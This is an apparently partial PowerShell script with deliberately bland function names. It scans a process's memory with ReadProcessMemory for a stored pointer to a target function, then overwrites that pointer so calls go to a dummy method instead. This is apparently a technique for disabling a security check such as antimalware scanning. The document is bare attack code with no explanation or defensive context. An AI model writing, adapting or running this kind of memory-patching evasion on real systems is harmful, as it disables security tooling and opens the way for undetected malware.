function boring {
$random = '123456789012345677898421423523654364543141'
}

function Cool {
    :initialloop for($j = $initst; $j -lt $maxof; $j += $negoff){
        [IntPtr] $meptos = [Int64] $mepter - $j
        $redmemarr = [byte[]]::new($ReadBytes)
        $apir = [APIs]::ReadProcessMemory($Handle, $meptos, $redmemarr, $ReadBytes,[ref]$dummy)
        for ($i = 0; $i -lt $redmemarr.Length; $i += 1) {
        $bytes = [byte[]]($redmemarr[$i], $redmemarr[$i + 1], $redmemarr[$i + 2], $redmemarr[$i + 3], $redmemarr[$i + 4], $redmemarr[$i + 5], $redmemarr[$i + 6], $redmemarr[$i + 7])
        [IntPtr] $potc = [bitconverter]::ToInt64($bytes,0)
        if ($potc -eq $funcAddr) {
            Write-Host "Found @ $($j) : $($i)!"
            [IntPtr] $mop = [Int64] $meptos + $i
            break initialloop
        }
        }
    }
    [IntPtr] $dup = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
    $buf = [IntPtr[]] ($dup)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mop, 1)

    $fd=Get-Date;
    $te = ($fd - $InitialDate).TotalSeconds;
    Write-Host "$te seconds"
}
